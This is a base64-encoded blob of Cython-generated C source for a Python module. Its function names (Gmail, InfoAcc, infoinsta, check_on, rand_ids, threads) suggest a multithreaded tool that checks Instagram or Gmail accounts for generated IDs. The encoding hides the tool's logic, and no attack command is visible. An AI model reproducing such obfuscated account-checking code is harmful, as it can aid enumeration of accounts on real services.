XhfdF81ID0gX19QeXhfUHlTZXF1ZW5jZV9NdWx0aXBseShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzFfMzltLCA2MCk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDg5LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICBfX3B5eF90XzYgPSAxOwogIHsKICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzEwLCBfX3B5eF90XzV9OwogICAgX19weXhfdF8zID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF80LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgyLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgODksIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgfQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwoKICAKICBfX3B5eF90XzQgPSBOVUxMOwogIF9fUHl4X0lOQ1JFRihfX3B5eF9idWlsdGluX2lucHV0KTsKICBfX3B5eF90XzUgPSBfX3B5eF9idWlsdGluX2lucHV0OyAKICBfX3B5eF90XzYgPSAxOwogIHsKICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzE2fTsKICAgIF9fcHl4X3RfMyA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfNSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF82LCAoMi1fX3B5eF90XzYpIHwgKF9fcHl4X3RfNipfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgOTAsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgfQogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfSUQsIF9fcHl4X3RfMykgPCAoMCkpIF9fUFlYX0VSUigwLCA5MCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CgogIAogIF9fcHl4X3RfMyA9IF9fUHl4X0N5RnVuY3Rpb25fTmV3KCZfX3B5eF9tZGVmXzJuZV8xcHBwcCwgMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3BwcHAsIE5VTEwsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9uZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgKChQeU9iamVjdCAqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzRdKSk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDkzLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3BwcHAsIF9fcHl4X3RfMykgPCAoMCkpIF9fUFlYX0VSUigwLCA5MywgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CgogIAogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfeXksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9hemVydHl1aW9wbWxramhnZmRzcXd4Y3ZibikgPCAoMCkpIF9fUFlYX0VSUigwLCAxMDgsIF9fcHl4X0wxX2Vycm9yKQoKICAKICBfX3B5eF90XzMgPSBfX1B5eF9DeUZ1bmN0aW9uX05ldygmX19weXhfbWRlZl8ybmVfM3RsbCwgMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RsbCwgTlVMTCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X25lLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCAoKFB5T2JqZWN0ICopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbNV0pKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMTExLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RsbCwgX19weXhfdF8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDExMSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CgogIAogIF9fcHl4X3RfNSA9IE5VTEw7CiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90bGwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAxNjEsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogIF9fcHl4X3RfNiA9IDE7CiAgewogICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNSwgTlVMTH07CiAgICBfX3B5eF90XzMgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNiwgKDEtX19weXhfdF82KSB8IChfX3B5eF90XzYqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgIGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDE2MSwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICB9CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CgogIAogIF9fcHl4X3RfMyA9IF9fUHl4X0N5RnVuY3Rpb25fTmV3KCZfX3B5eF9tZGVmXzJuZV81cmVzdCwgMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3Jlc3QsIE5VTEwsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9uZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgKChQeU9iamVjdCAqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzZdKSk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDE2NCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZXN0LCBfX3B5eF90XzMpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTY0LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKCiAgCiAgX19weXhfdF8zID0gX19QeXhfQ3lGdW5jdGlvbl9OZXcoJl9fcHl4X21kZWZfMm5lXzdkYXRlLCAwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZGF0ZSwgTlVMTCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X25lLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCAoKFB5T2JqZWN0ICopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbN10pKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMTk5LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2RhdGUsIF9fcHl4X3RfMykgPCAoMCkpIF9fUFlYX0VSUigwLCAxOTksIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwoKICAKICBfX3B5eF90XzMgPSBfX1B5eF9DeUZ1bmN0aW9uX05ldygmX19weXhfbWRlZl8ybmVfOUluZm9BY2MsIDAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9JbmZvQWNjLCBOVUxMLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfbmUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsICgoUHlPYmplY3QgKilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYls4XSkpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAyMjgsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfSW5mb0FjYywgX19weXhfdF8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDIyOCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CgogIAogIF9fcHl4X3RfMyA9IF9fUHl4X0N5RnVuY3Rpb25fTmV3KCZfX3B5eF9tZGVmXzJuZV8xMUdtYWlsLCAwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfR21haWwsIE5VTEwsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9uZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgKChQeU9iamVjdCAqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzldKSk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDI4NiwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9HbWFpbCwgX19weXhfdF8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDI4NiwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CgogIAogIF9fcHl4X3RfMyA9IF9fUHl4X0N5RnVuY3Rpb25fTmV3KCZfX3B5eF9tZGVmXzJuZV8xM2Zvcm1hdF9udW1iZXIsIDAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9mb3JtYXRfbnVtYmVyLCBOVUxMLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfbmUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsICgoUHlPYmplY3QgKilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlsxMF0pKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMzQxLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2Zvcm1hdF9udW1iZXIsIF9fcHl4X3RfMykgPCAoMCkpIF9fUFlYX0VSUigwLCAzNDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwoKICAKICBfX3B5eF90XzMgPSBfX1B5eF9DeUZ1bmN0aW9uX05ldygmX19weXhfbWRlZl8ybmVfMTVjaGVja19vbiwgMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NoZWNrX29uLCBOVUxMLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfbmUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsICgoUHlPYmplY3QgKilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlsxMV0pKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMzUwLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NoZWNrX29uLCBfX3B5eF90XzMpIDwgKDApKSBfX1BZWF9FUlIoMCwgMzUwLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKCiAgCiAgX19weXhfdF8zID0gX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAzODQsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaW5mb2luc3RhLCBfX3B5eF90XzMpIDwgKDApKSBfX1BZWF9FUlIoMCwgMzg0LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKCiAgCiAgX19weXhfdF8zID0gUHlMaXN0X05ldygwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMzg1LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2lkcywgX19weXhfdF8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDM4NSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CgogIAogIF9fcHl4X3RfMyA9IF9fUHl4X0N5RnVuY3Rpb25fTmV3KCZfX3B5eF9tZGVmXzJuZV8xN3JhbmRfaWRzLCAwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmFuZF9pZHMsIE5VTEwsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9uZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgKChQeU9iamVjdCAqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzEyXSkpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAzODgsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmFuZF9pZHMsIF9fcHl4X3RfMykgPCAoMCkpIF9fUFlYX0VSUigwLCAzODgsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwoKICAKICBfX3B5eF90XzMgPSBfX1B5eF9DeUZ1bmN0aW9uX05ldygmX19weXhfbWRlZl8ybmVfMTl1dXUsIDAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV91dXUsIE5VTEwsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9uZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgKChQeU9iamVjdCAqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzEzXSkpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAzOTcsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdXV1LCBfX3B5eF90XzMpIDwgKDApKSBfX1BZWF9FUlIoMCwgMzk3LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKCiAgCiAgX19weXhfdF8zID0gUHlMaXN0X05ldygwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgNDQ3LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RocmVhZHMsIF9fcHl4X3RfMykgPCAoMCkpIF9fUFlYX0VSUigwLCA0NDcsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwoKICAKICBfX3B5eF90XzMgPSBfX1B5eF9DeUZ1bmN0aW9uX05ldygmX19weXhfbWRlZl8ybmVfMjFwcmludGluZywgMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3ByaW50aW5nLCBOVUxMLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfbmUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsICgoUHlPYmplY3QgKilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlsxNF0pKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgNDUwLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3ByaW50aW5nLCBfX3B5eF90XzMpIDwgKDApKSBfX1BZWF9FUlIoMCwgNDUwLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKCiAgCiAgX19weXhfdF80ID0gTlVMTDsKICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3ByaW50aW5nKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgNDYxLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICBfX3B5eF90XzYgPSAxOwogIHsKICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzQsIE5VTEx9OwogICAgX19weXhfdF8zID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF81LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgxLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA0NjEsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgfQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwoKICAKICBfX3B5eF90XzMgPSBfX1B5eF9QeURpY3RfTmV3UHJlc2l6ZWQoMCk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGVzdCwgX19weXhfdF8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwoKICAKCiAgZ290byBfX3B5eF9MMDsKICBfX3B5eF9MMV9lcnJvcjo7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF85KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTApOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7CiAgaWYgKF9fcHl4X20pIHsKICAgIGlmIChfX3B5eF9tc3RhdGUtPl9fcHl4X2QgJiYgc3RyaW5ndGFiX2luaXRpYWxpemVkKSB7CiAgICAgIF9fUHl4X0FkZFRyYWNlYmFjaygiaW5pdCBuZSIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpOwogICAgfQogICAgI2lmICFDWVRIT05fVVNFX01PRFVMRV9TVEFURQogICAgUHlfQ0xFQVIoX19weXhfbSk7CiAgICAjZWxzZQogICAgUHlfREVDUkVGKF9fcHl4X20pOwogICAgaWYgKHB5c3RhdGVfYWRkbW9kdWxlX3J1bikgewogICAgICBQeU9iamVjdCAqdHAsICp2YWx1ZSwgKnRiOwogICAgICBQeUVycl9GZXRjaCgmdHAsICZ2YWx1ZSwgJnRiKTsKICAgICAgUHlTdGF0ZV9SZW1vdmVNb2R1bGUoJl9fcHl4X21vZHVsZWRlZik7CiAgICAgIFB5RXJyX1Jlc3RvcmUodHAsIHZhbHVlLCB0Yik7CiAgICB9CiAgICAjZW5kaWYKICB9IGVsc2UgaWYgKCFQeUVycl9PY2N1cnJlZCgpKSB7CiAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfSW1wb3J0RXJyb3IsICJpbml0IG5lIik7CiAgfQogIF9fcHl4X0wwOjsKICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICAjaWYgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUCiAgcmV0dXJuIChfX3B5eF9tICE9IE5VTEwpID8gMCA6IC0xOwogICNlbHNlCiAgcmV0dXJuIF9fcHl4X207CiAgI2VuZGlmCn0KCgp0eXBlZGVmIHN0cnVjdCB7CiAgICBjb25zdCBjaGFyICpzOwojaWYgNzkyIDw9IDY1NTM1CiAgICBjb25zdCB1bnNpZ25lZCBzaG9ydCBuOwojZWxpZiA3OTIgLyAyIDwgSU5UX01BWAogICAgY29uc3QgdW5zaWduZWQgaW50IG47CiNlbGlmIDc5MiAvIDIgPCBMT05HX01BWAogICAgY29uc3QgdW5zaWduZWQgbG9uZyBuOwojZWxzZQogICAgY29uc3QgUHlfc3NpemVfdCBuOwojZW5kaWYKI2lmIDEgPD0gMzEKICAgIGNvbnN0IHVuc2lnbmVkIGludCBlbmNvZGluZyA6IDU7CiNlbGlmIDEgPD0gMjU1CiAgICBjb25zdCB1bnNpZ25lZCBjaGFyIGVuY29kaW5nOwojZWxpZiAxIDw9IDY1NTM1CiAgICBjb25zdCB1bnNpZ25lZCBzaG9ydCBlbmNvZGluZzsKI2Vsc2UKICAgIGNvbnN0IFB5X3NzaXplX3QgZW5jb2Rpbmc7CiNlbmRpZgogICAgY29uc3QgdW5zaWduZWQgaW50IGlzX3VuaWNvZGUgOiAxOwogICAgY29uc3QgdW5zaWduZWQgaW50IGludGVybiA6IDE7Cn0gX19QeXhfU3RyaW5nVGFiRW50cnk7CnN0YXRpYyBjb25zdCBjaGFyICogY29uc3QgX19weXhfc3RyaW5nX3RhYl9lbmNvZGluZ3NbXSA9IHsgMCB9OwpzdGF0aWMgY29uc3QgX19QeXhfU3RyaW5nVGFiRW50cnkgX19weXhfc3RyaW5nX3RhYltdID0gewogIHtfX3B5eF9rXywgc2l6ZW9mKF9fcHl4X2tfKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rXzAsIHNpemVvZihfX3B5eF9rXzApLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfMF8wX251bGxfbnVsbF93ZWJfZ2xpZl9zaWdudXBfMCwgc2l6ZW9mKF9fcHl4X2tfMF8wX251bGxfbnVsbF93ZWJfZ2xpZl9zaWdudXBfMCksIDAsIDEsIDB9LCAKICB7X19weXhfa18wZDA2N2MyZjg2Y2FjMmMxN2Q2NTU2MzFjOWNlYzI0MCwgc2l6ZW9mKF9fcHl4X2tfMGQwNjdjMmY4NmNhYzJjMTdkNjU1NjMxYzljZWMyNDApLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfMGQwNjdjMmY4NmNhYzJjMTdkNjU1NjMxYzljZWMyNDBfMiwgc2l6ZW9mKF9fcHl4X2tfMGQwNjdjMmY4NmNhYzJjMTdkNjU1NjMxYzljZWMyNDBfMiksIDAsIDEsIDB9LCAKICB7X19weXhfa18xLCBzaXplb2YoX19weXhfa18xKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rXzE3MDAyNTE1NzRfOTgyLCBzaXplb2YoX19weXhfa18xNzAwMjUxNTc0Xzk4MiksIDAsIDEsIDB9LCAKICB7X19weXhfa18xXzAwMCwgc2l6ZW9mKF9fcHl4X2tfMV8wMDApLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfMV8zOW0sIHNpemVvZihfX3B5eF9rXzFfMzltKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rXzFmLCBzaXplb2YoX19weXhfa18xZiksIDAsIDEsIDB9LCAKICB7X19weXhfa18xa2Jwcywgc2l6ZW9mKF9fcHl4X2tfMWticHMpLCAwLCAxLCAwfSwgCiAge19fcHl4X2tf